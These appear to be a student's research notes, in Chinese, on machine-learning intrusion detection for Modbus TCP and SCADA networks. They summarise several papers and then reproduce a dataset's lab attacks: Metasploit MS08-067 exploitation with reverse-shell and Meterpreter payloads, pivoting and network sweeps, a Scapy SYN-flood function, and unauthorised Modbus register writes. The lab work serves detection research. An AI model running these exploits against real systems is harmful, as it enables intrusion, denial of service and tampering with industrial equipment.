### 4/13

IT信息技术；OT操作技术

1.探针：获取数据。设备指纹标识

2.区块链：留痕，节点信息形成证据链，检测溯源

3.数据检测：数据分析



重点可以关注数据分析（如：机器学习）技术可以分析出存在于工控协议（例如：Modbus_tcp）中的**哪些种OT域安全问题**

并且注意这些分析过程中 使用的**数据来源**是什么 选取的数据**哪些维度**进行分析



##### 1.基于机器学习的工业控制网络入侵检测技术综述 刘奇旭

ICS（Industrial Control System）：传统工业控制系统。ICS与互联网结合为工业互联网，会引入安全问题。
使用基于机器学习的入侵检测系统IDS（Intrusion Detection System），检测传输数据是否异常

ICS分为三层：

- 企业网络：企业进行监视
- 控制网络：**监控与数据采集系统SCADA**，控制器
- 现场网络：对生产设备进行感知和操作PLC，RTU

层之间通信需要工业控制通信协议：Modbus在下两层之间通信，ICCP，DNP3。为了提高通信效率，缺少认证和加密

工业互联网和普通IT网络的不同：

- 协议不同，不安全，更注重效率和可用性
- 场景多样：攻击方式不同
- 独特的限制和要求：数据噪声多，实时性，难以重启和更新

工业互联网中的入侵检测：是一个**分类**问题。
常用机器学习方法：OCSVM无监督学习，将异常点分出来。
常用数据集：KDD（KDD包含DDoS、探针攻击等攻击，包含特征：[KDD99数据集的特征(Features)介绍 - 常给自己加个油 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zywnnblog/p/15228905.html)）

传统分类问题的评价指标：Accuracy，F1等；
入侵检测系统中采用的评价指标：检测时延、系统负载、鲁棒性、复杂度

入侵检测使用的**数据来源**：

- 基于网络流量：整个系统网络的流量，不需要单节点的日志
- 基于主机：主机日志，配置

检测对象：

- 流量：宏观的？
- 协议格式和状态
- 设备状态。

入侵检测分类方法：

- 基于特征匹配：与已知攻击行为的特征比较；
- 基于行为：行为与正常操作行为比较，发现异常行为，误报率高。



文章的研究点：攻击场景，应用限制和挑战，机器学习算法

**解决哪些安全问题**：

- 智能电网中虚假数据注入攻击，窃取电力
- 拒绝服务攻击
- 收集信息



##### 2.基于机器学习的工业控制网络入侵检测方法研究 刘冰冰

机器学习入侵检测流程：

- 抓包：对SCADA的攻击流量数据；
  提取**网络流量特征**：设备地址，功能代码，SCADA网络拓扑，服务相对静态
- 输入模型，给出分类结果：模型分为
  LightGBM监督学习：用于已知攻击
  AE-1SVM无监督学习：用于无标签，未知攻击
- 评价标准：混淆矩阵

数据来源：Thomas Moms的基于 Modbus 协议的工业控制网络数据集，报文包括正常、注入攻击、拒绝服务、侦查攻击

注入分类：

- 恶意响应注入攻击
- 命令注入攻击：恶意状态、参数、功能



##### 3.工业控制系统安全态势感知技术研究 周明

工控系统安全态势感知：目标是系统自我保护并修复

- 觉察：输入监测数据，入侵检测，输出异常类型
- 理解：构建模型，推理攻击者意图，评估影响
- 投射：为攻击者建模，预测威胁事件

入侵检测**输入数据特征**

- 基于网络流量：协议载荷：分析数据；流量外观：分析数据包大小、时间
- 基于物理过程：输入传感器测量值
- 基于侧信道：输入电磁信号、能耗、PLC 时钟数量、噪音指纹、旁路检测等设备端物理信息



##### 4.基于 Snort 的工业控制系统入侵检测系统设计与实现 帅隆文

ModbusTCP：主从架构。有三种报文：请求报文、正常响应报文、异常响应报文。客户端发送的请求报文包含功能码；服务器执行完客户端请求，返回相应信息，包含功能码和异常码。

基于入侵检测系统Snort检测Modbus TCP异常报文。异常报文就是OT域安全问题，那么怎样的报文是异常的呢，即有哪些**安全问题**？篡改响应数据包内容，使得测量值非法；注入恶意命令，损坏设备；拒绝服务攻击

机器学习**数据来源**：Snort检测到的数据，包括系统工作状态、日志、网络流量、用户操作行为。由于工厂数据是机密，所以实验使用`Antoine Lemay`开源的数据集，pcap格式（wireshark配置脚本文件），包含真实攻击流量，协议为Modbus TCP

**特征**：非数值特征转化为数值特征

<img src="202204/pic/ModbusTCP特征.png" alt="ModbusTCP特征" style="zoom: 67%;" />



##### 5.cset16-paper-lemay-Providing SCADA network data sets for intrusion detection research//Antoine Lemay

讲述了如何生成论文4中的**SCADA网络数据集**

Lemay在一个SCADA沙箱（软件可安全运行的虚拟空间）中实现了小型的SCADA网络。
组成要素：MTU主终端单元，RTU远程终端单元。
变量：MTU,RTU数量，Modbus 轮询周期、操作员通过MTU 执行的操作数

然后模拟攻击行为：先攻击一个合法机器，再使用该机器作为跳板攻击工控网络



------

### 4/22

#### Q1：综述里机器学习、神经网络大类的优缺点、差异度

先用聚类或降维对数据处理，再进入机器学习方法进行检测分类

##### 传统机器学习分类方法

优点：参数少，数据集要求低，计算资源需求少，对普通攻击检测率高，检测延迟小（不超过10s）
缺点：需要选取合适的输入特征，效果较差

- K-means聚类：无监督学习。空间中找k个中心，每个点分给最近的中心，每个类中再迭代更新中心点，直到不变
  缺点：依赖于特征选择，有噪声不适合
- OCSVM(One class SVM)：无监督学习。训练数据只有一类，希望找到一个超平面划分，使得超平面离原点最远
  优点：只需正常类的样本，无需人工标注
  缺点：误报率高，无法检测具体攻击类型

##### 深度学习方法

优点：特征提取工作量小，可以检测高级的攻击方式
缺点：参数多，需要数据集足够大，训练计算量大，检测延迟大（受攻击后，检测到异常所用时间）

- DNN：全连接神经网络。输入层-隐藏层-输出层，反向传播
  优点：能够提取特征中的信息
  缺点：参数太多，不能观察中间结果，训练过程负杂，消耗计算资源，难以满足实时性

- CNN：卷积神经网络，输入层-卷积层(降维)-池化层-全连接层-输出层，专用于图像。可以把数据流预处理为图像形式，进行分类

- LSTM：长短期记忆人工神经网络，是一种特殊的循环神经网络RNN，输入门-遗忘门-输出门，可以记忆长序列的状态，专用于文本等序列数据。作用是给n个值，预测第n+1个值的数据。
  原理：**序列数据**$x_1,x_2,...,x_n$输入LSTM，输出到一个softmax分类器得到分类$\hat x_{n+1}$，并计算其与真实值$x_{n+1}$之间的差距，如果差距过大则认为异常

- 自编码器AE：结构为编码器-解码器，训练时希望输入数据编码（降维）后再解码的输出和输入差距尽量小，训练后即可抛弃解码器。
  原理：输入数据通过编码器降维，从而**提取特征**，再作为其他分类器（如softmax分类器）的输入
  softmax能够扩大最终分数的差距
  $$
  f(x_i)=\frac{e^{y_i}}{\sum_{i}e^{y_i}}
  $$
  

##### 强化学习方法

不要求预先给定数据，而是通过环境对动作的奖励更新参数

- DQN：深度强化学习
  Q-learning：$Q(s,a)$代表状态s下进行动作a的奖励，现在希望通过深度神经网络得到$f(s,a,w)\approx Q(s,a)$，即Q的拟合，解决状态和行为过多问题



#### Q2：SCADA网络数据集 论文里面要重点关注它构造的这个数据集的采集模型是什么，以及可能的复现方案

采集模型：即1）它的工控网络架构；2）如何构造数据，以及构造了哪些类的数据3）如何采集（可能的实现方案）

##### 工控网络架构

三个级别：
2级：SCADA控制系统
1级：现场设备，如传感器、执行器、控制器RTU
0级：物理过程

每个操作站（Operator Workstation）使用SCADA软件，包括主终端单元MTU和人机界面HMI。

MTU对每个RTU（Controller，控制器）轮询，每隔几秒发送一次Modbus请求控制器状态，每个RTU控制多个现场设备（Field Device）

HMI给操作员可视化物理过程状态，操作员可以通过HMI给控制器发送Modbus写请求，改变现场设备状态。控制器改变设备状态后回复响应报文

##### 挑战

（1）在常规轮询之间插入恶意流量，攻击很容易发现

（2）数据报的内容受系统属性、噪声的影响。解决方法：在模拟器中加入熵。每个控制器测量三个分支的电压，通过改变断路器，来改变Modbus响应报文中的测量值，更加真实

（3）如何标记恶意流量？如果数据报属于一个恶意会话，则标记为恶意。例如包含漏洞的数据报标记为恶意，为了发送漏洞而首先发送的SYN连接数据报也标记为恶意，虽然它本身没包含恶意行为

##### 构造数据

MTU使用ScadaBR（SCADA系统软件）实现，RTU使用modbus_tk（Python包）实现，用于正常的轮询。

每个控制器运行相同的物理系统，用1~4四值代表断路器的状态

##### 4种攻击

首先建立一个Metasploit枢纽点（在被破坏的机器上添加了一个额外的网卡），并通过枢轴点发起攻击。
（1）第一次攻击，受感染的计算机会远程攻击第二个控制器
（2）上传新的恶意软件
（3）指纹识别攻击：发送连续读取数据包收集信息
（4）发送未授权命令

- 使用Scapy编程攻击
- 使用Kali Metasploit填写数据报载荷

```sh
msfconsole
search ms08_067
use exploit/windows/smb/ms08_067_netapi
show targets # 查看能攻击的系统
set payload generic/shell_reverse_tcp
show options # 查看需要填写的内容
set RHOST 192.168.10.130
exploit # 必须是xp英文版才能攻击成功
```



##### 如何采集

通过旁路部署的数据报采集程序捕获MTU和RTU之间的所有数据报，软件：wireshark

旁路实现：光纤分光？



##### 5.1 工控IPv6的Modbus_TCP协议安全技术防护研究_陈鑫龙

仿真，模拟正常通信：主站MTU模拟器Modbus Poll，从站RTU模拟器Modbus Slave

先攻下MTU

Scapy编写攻击代码：篡改功能码、寄存器地址；

<img src="202204/pic/ModbusTCP报文.png" style="zoom:60%;" />

拒绝服务攻击

```python
def synFlood(targetIP,targetPort):
    srcIPList=[100]# 生成多个不同的源IP
    for srcPort in range(1024,65535):# source port
        srcIpIndex=random.randrange(100)
        ipPacket=IP(src=srcIPList[srcIpIndex],dst=targetIP)
        tcpPacket=TCP(sport=srcPort,dport=targetPort)
        totalPacket=ipPacket/tcpPacket# 合成IP数据报
        send(totalPacket)
```



采集：Wireshark抓包，Tshark只捕获包中具体字段

字段  解释 
ipv6.plen  除 IPv6 基本报头外其它部分的长度 
ipv6.nxt  标识下一个报头头部的类型 
ipv6.hlim  指定报文可以有效转发的次数 
ipv6.src_add  源 IPv6 地址 
modbus.fun_code  Modbus 协议功能码。 
modbus.regnum  Modbus 协议寄存器地址。



------

### 4/29

#### 1.熟悉modbus poll和 modbus slave，在本地将两者联通

功能码：

|                          | 功能码 | 功能         |
| ------------------------ | ------ | ------------ |
| READ_COILS               | H01    | 读线圈       |
| READ_DISCRETE_INPUTS     | H02    | 读离散输入   |
| READ_HOLDING_REGISTERS   | H03    | 读保持寄存器 |
| READ_INPUT_REGISTERS     | H04    | 读输入寄存器 |
| WRITE_SINGLE_COIL        | H05    | 写单一线圈   |
| WRITE_SINGLE_REGISTER    | H06    | 写单一寄存器 |
| WRITE_MULTIPLE_COILS     | H15    | 写多个线圈   |
| WRITE_MULTIPLE_REGISTERS | H16    | 写多寄存器   |

- 线圈COILS是布尔值
- 输入寄存器INPUT_REGISTERS是只读的，通常是状态寄存器或者是输入结果寄存器

##### Modbus Slave

Modbus Slave软件主要用于仿真Modbus从站或Modbus服务器，接收主站的命令包，回送数据包

Modbus TCP/IP协议

Setup中可以设定功能码，访问哪些数据（线圈Coil/寄存器Register）

- Slave ID：slave编号
- Function：功能码
- Address：要访问的寄存器起始编号
- Quantity：要访问的寄存器数量

```
ID=1:F=03
```

<img src="202204/pic/modbusSlave.png" style="zoom:67%;" />

右键表格选择auto increment，寄存器值自增

##### Modbus Poll

Modbus Poll软件主要用于仿真Modbus主站或Modbus客户端，来测试Modbus从设备

Setup中可以设定轮询间隔，读哪些数据（线圈Coil布尔值/寄存器Register）

首先运行Modbus Slave，Connection->connect，端口为502。然后运行Modbus Poll，Connection->connect
Tx发送命令次数；Err错误次数；id从机地址；F功能码；SR间隔时间

```
Tx= 583: Err = 0: ID = 1: F= 03: SR = 1000ms
```

<img src="202204/pic/modbusPoll.png" style="zoom: 67%;" />

#### 2.熟悉modbus-tk，在本地模拟pool和slave的联通模式，进行一次通信

[ljean/modbus-tk: Create Modbus app easily with Python (github.com)](https://github.com/ljean/modbus-tk)

modbus_tk提供了Modbus TCP和Modbus RTU这两种协议的slave和master的实现

（1）模拟master，向Modbus Slave发出命令读寄存器0~10：

```python
import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md

master = mt.TcpMaster("127.0.0.1", 502) # 主站的端口为502
master.set_timeout(5.0)

"""
@:param
slave=1 : identifier of the slave. from 1 to 247.  0为⼴播所有的slave
function_code 功能码
starting_address 开始地址
quantity_of_x 寄存器/线圈的数量
output_value：⼀个整数或可迭代的值：1/[1,1,1,0,0,1]/xrange(12)
data_format
expected_length
"""
res = master.execute(slave=1, 
                     function_code=md.READ_HOLDING_REGISTERS,
                     starting_address=0, 
                     quantity_of_x=10, 
                     output_value=5)
res = [ord(i) for i in res]
# 取到的所有寄存器的值
for i,reg in enumerate(res):
    if i%2==1:
        print(reg,end=" ")
```

输出结果：其中2,43的二进制为10,0010,1011，等于555的二进制。（Alias是别名，可不填）

<img src="202204/pic/modbus_tk.png" style="zoom:60%;" />

将寄存器0的值改成6：

```python
res = master.execute(slave=1, function_code=md.WRITE_SINGLE_REGISTER,
                     starting_address=0, output_value=6)
```

[modbus_tk模块详细使用_liushuo1024的博客-CSDN博客_modbus_tk](https://blog.csdn.net/qq_23076153/article/details/114021408)

（2）模拟master和slave

官方例子：[modbus-tk/examples at master · ljean/modbus-tk (github.com)](https://github.com/ljean/modbus-tk/tree/master/examples)

tcpslave_example.py

```python
#Create the server
server = modbus_tcp.TcpServer()
logger.info("running...")
logger.info("enter 'quit' for closing the server")

server.start()

slave_1 = server.add_slave(1)
slave_1.add_block('0', cst.HOLDING_REGISTERS, 0, 100)
```

tcpmaster_example.py

```python
master = modbus_tcp.TcpMaster()
master.set_timeout(5.0)
logger.info("connected")

# 从0号寄存器开始连着读10个寄存器
res=master.execute(1, cst.READ_HOLDING_REGISTERS, 0, 10)
res = [ord(i) for i in res]
# 取到的所有寄存器的值
for i, reg in enumerate(res):
    print(reg, end=" ")
    if i % 2 == 1:
        print()
```

先运行slave：`python tcpslave_example.py`

输入`set_values 1 0 1 2 3 6 12`，表示slave号为1，块序号为0，起始寄存器为1，连续向下写入2,3,6,12

运行master：`python tcpmaster_example.py`，输出正确的寄存器值

![](202204/pic/modbus_tk模拟m-s.png)

#### 3.熟悉使用metasploit,复现论文中的攻击，尽量使用MS08-netapi ,payload可以任选

- 先ms08入侵一个可以访问的网络中的RTU，以它作为pivot来入侵无法访问的网络
- 利用该RTU攻击其他RTU，并通过meterpreter channel通道传exe给其他RTU
- 执行exe

##### （1）Kali使用ms08远程攻击一个RTU1

要求：RTU1同时属于两个网段（有两张网卡）

MS08-067是一种windows远程执行代码漏洞，攻击者可以远程完全控制受影响的系统（win2000,2003,xp）。ms08_067_net api是Metasploit的一个模块

靶机：Windows XP SP3 Chinese - Simplified (NX) `IP: 192.168.10.135`

```sh
net stop sharedaccess # 关闭防火墙
```

攻击机：Kali Linux `IP: 192.168.10.131`

```sh
msfconsole
nmap --script=vuln 192.168.10.135 # 扫描漏洞

use exploit/windows/smb/ms08_067_netapi # 使用模块
show targets # 查看能攻击的系统
set target 34 # 操作系统版本为简中xp3
set payload generic/shell_reverse_tcp
show options # 查看需要填写的内容
set RHOST 192.168.10.135
set RPORT 445
exploit
```

建立会话

![shell_reverse_tcp攻击](202204/pic/shell_reverse_tcp攻击.png)

##### （2）Kali通过Meterpreter上传恶意软件exe到RTU1

Meterpreter是一种payload，exploit后会出现meterpreter交互式shell

```sh
use exploit/windows/smb/ms08_067_netapi
set target 34
set payload windows/meterpreter/reverse_tcp
set RHOSTS 192.168.10.135
exploit
```

![](202204/pic/meterpreter.png)

常用命令

```sh
meterpreter > getwd # 显示靶机当前目录
meterpreter > getlwd # 攻击机当前目录
# 攻击机文件上传到靶机
meterpreter > upload '/home/mika/D/tcpmaster_example.py' 'C:\\Documents and Settings\\xuegod_root\\桌面'
```

可以把python程序编译成exe，在靶机上执行

##### （2.5）借助RTU1作为跳板攻击其他RTU

pivot技术参考[Metasploit - Pivoting (tutorialspoint.com)](https://www.tutorialspoint.com/metasploit/metasploit_pivoting.htm)

在meterpreter下：首先对靶机ipconfig，在另一网段上IP为10.10.10.101，所以网段为10.10.10.0/24，通过autoroute将该网段添加至路由表

```sh
meterpreter > sessions 1 # 使用会话1
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background # 暂时退出当前会话
```

![](202204/pic/autoroute.png)

然后扫描该网段（这里用192.168.10.0/24）内的主机IP，再进行攻击

```sh
sudo msfconsole # 需要root权限
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.10.0/24
set THREADS 50
run
```

![](202204/pic/扫描网段.png)



##### （3）RTU1连续发送读取数据包给RTU2

```python
res = master.execute(slave=2, function_code=md.READ_HOLDING_REGISTERS,
                     starting_address=0, quantity_of_x=10, output_value=5)
```



##### （4）发送未授权命令

```python
res = master.execute(slave=2, function_code=md.WRITE_SINGLE_REGISTER,
                     starting_address=0, output_value=6)
```

